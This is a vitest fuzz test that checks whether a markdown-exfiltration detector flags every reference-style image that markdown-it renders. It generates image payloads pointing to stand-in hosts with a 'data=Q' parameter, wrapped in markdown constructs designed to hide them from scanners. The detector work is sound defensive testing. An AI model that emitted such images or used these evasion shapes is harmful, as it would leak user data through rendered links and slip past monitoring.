import { createRequire } from 'node:module';
import { describe, expect, it } from 'vitest';
import { MarkdownReferenceExfiltrationDetector } from '../detectors/behavioural-control/markdown-reference-exfiltration';

/**
 * A second, independent fuzz against a real renderer (#225). The grammar was written separately from the one in
 * markdown-reference-oracle.test.ts: instead of mixing random fragments, it builds a reference-style image from
 * one named construct family at a time (the shapes that hid an image from the scan before the block parser:
 * a stray bracket and a code span in the alt text, a backtick in a link destination or title, in a definition
 * title, in a table cell or in inline HTML, a list marker or lookalike under a paragraph, a setext underline,
 * a fence that ends with its container, a label split across quote lines), then wraps it in random nested
 * block quotes and list items. Every document markdown-it draws an exfil image for (HTML off and on) must be
 * flagged.
 *
 * Calibration: against the scan from before the block parser this generator finds a miss in about 60% of
 * documents, so a clean result on the current scan is evidence, not an empty fuzz.
 *
 * `FUZZ_CASES` sets the documents per seed (default 4000) and `FUZZ_SEED` runs one extra seed.
 */
const require = createRequire(import.meta.url);
const MarkdownIt = require('markdown-it');
const renderers = [false, true].map((html) => new MarkdownIt({ html, linkify: false, typographer: false }));
const detector = new MarkdownReferenceExfiltrationDetector();

const LABELS = ['r', 'R', 'ref', 'report', 'x y', 'a\\]b'];
const URLS = ['https://e.x/p.png?data=Q', 'https://fake.example/p.png?data=Q'];

type Wrap = (text: string) => string;
const CONTAINERS: Wrap[] = [
  (s) => s,
  (s) => s.split('\n').map((x) => '> ' + x).join('\n'),
  (s) => '- ' + s.replace(/\n/g, '\n  '),
  (s) => '> - ' + s.replace(/\n/g, '\n>   '),
  (s) => '2. ' + s.replace(/\n/g, '\n   '),
  (s) => '> > ' + s.replace(/\n/g, '\n> > '),
];

function makeRng(seed: number): { next: (n: number) => number; one: <T>(items: T[]) => T } {
  let state = seed >>> 0;
  const next = (n: number): number => {
    state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
    return state % n;
  };
  return { next, one: (items) => items[next(items.length)] };
}

function families(one: <T>(items: T[]) => T): Array<[string, (label: string, url: string) => string]> {
  const alt = '[ ![a `]` b]'; // the `]` sits inside a code span, so a renderer reads the image whole
  return [
    ['stray-open-bracket-code-span-alt', (l, u) => `see [ note ![a \`]\` b][${l}]\n\n[${l}]: ${u}`],
    [
      'backtick-link-destination-or-title',
      (l, u) => one([`[x](a\`b) ${alt}[${l}]`, `[x](a "\`") ${alt}[${l}]`]) + `\n\n[${l}]: ${u}`,
    ],
    ['backtick-reference-title', (l, u) => `[z]: https://fake.example/a.png "\`"\n${alt}[${l}]\n\n[${l}]: ${u}`],
    ['gfm-table-cell', (l, u) => `| h1 | h2 |\n|---|---|\n| \` | ${alt}[${l}] \` |\n\n[${l}]: ${u}`],
    [
      'html-comment-or-attribute',
      (l, u) => one([`x <!-- \` --> ${alt}[${l}]`, `<span title="\`"> ${alt}[${l}]`]) + `\n\n[${l}]: ${u}`,
    ],
    [
      'ordered-empty-or-indented-list',
      (l, u) =>
        `para \`\n${one(['2. `', '7) `', '    - `', '    > `', '    1. `', '-\n  `'])} ${alt}[${l}]\n\n[${l}]: ${u}`,
    ],
    ['setext-heading-boundary', (l, u) => `para \`\n${one(['===', '-'])}\n${alt}[${l}] \`\n\n[${l}]: ${u}`],
    [
      'fence-ends-with-container',
      (l, u) =>
        one([
          `${u}\n\n- \`\`\`\n${alt}[${l}]\n\n\`\`\``,
          `${u}\n\n> - \`\`\`\n> ${alt}[${l}]\n> \`\`\``,
          `${u}\n\n> \`\`\`\n> x\n\n> \`\`\`\n> ${alt}[${l}]`,
        ]),
    ],
    [
      'multi-line-quote-label',
      (l, u) =>
        one([
          `> Summary:\n> ![chart][my\n> report]\n\n> [my\n> report]: ${u}`,
          `> x ![a][a\n>     > b]\n\n> [a > b]: ${u}`,
          `> ![alt][first\n>   second]\n\n> [first second]: ${u}`,
          `![alt][first\n> second]\n\n[first second]: ${u}`,
        ]),
    ],
    [
      'plain-reference-image',
      (l, u) => one([`![alt][${l}]`, `![a *b*][${l}]`, `![a\n b][${l}]`, `![${l}]`, '![alt][]']) + `\n\n[${l}]: ${u}`,
    ],
  ];
}

function drawsExfilImage(tokens: Array<{ type: string; attrGet(name: string): string | null; children?: unknown[] | null }>): boolean {
  return tokens.some(
    (t) =>
      (t.type === 'image' && String(t.attrGet('src') ?? '').includes('data=Q')) ||
      (Array.isArray(t.children) && drawsExfilImage(t.children as typeof tokens)),
  );
}

describe('construct-family fuzz against a real renderer (#225)', () => {
  const cases = Number(process.env.FUZZ_CASES ?? 4000);
  const seeds = [1729, 8675309, 424242, ...(process.env.FUZZ_SEED ? [Number(process.env.FUZZ_SEED)] : [])];
  for (const seed of seeds) {
    it(`flags every exfil image markdown-it draws (seed ${seed})`, () => {
      const { next, one } = makeRng(seed);
      const table = families(one);
      let rendered = 0;
      const missed: Array<{ family: string; doc: string }> = [];
      for (let n = 0; n < cases; n++) {
        const [family, build] = table[next(table.length)];
        let doc = build(one(LABELS), one(URLS));
        // Most documents are wrapped in one or two nested containers; a quarter stay bare.
        if (next(4) !== 0) for (let depth = 1 + next(2); depth > 0; depth--) doc = one(CONTAINERS)(doc);
        doc += `\n\ncase-${next(1_000_000)}`; // inert prose, so each document is its own
        if (!renderers.some((md) => drawsExfilImage(md.parse(doc, {})))) continue;
        rendered++;
        if (detector.findPatterns(doc).length === 0) missed.push({ family, doc });
      }
      // A generator that draws almost nothing proves nothing.
      expect(rendered / cases).toBeGreaterThan(0.5);
      expect(missed.slice(0, 3).map((m) => `${m.family}: ${JSON.stringify(m.doc)}`)).toEqual([]);
    }, 120_000);
  }
});
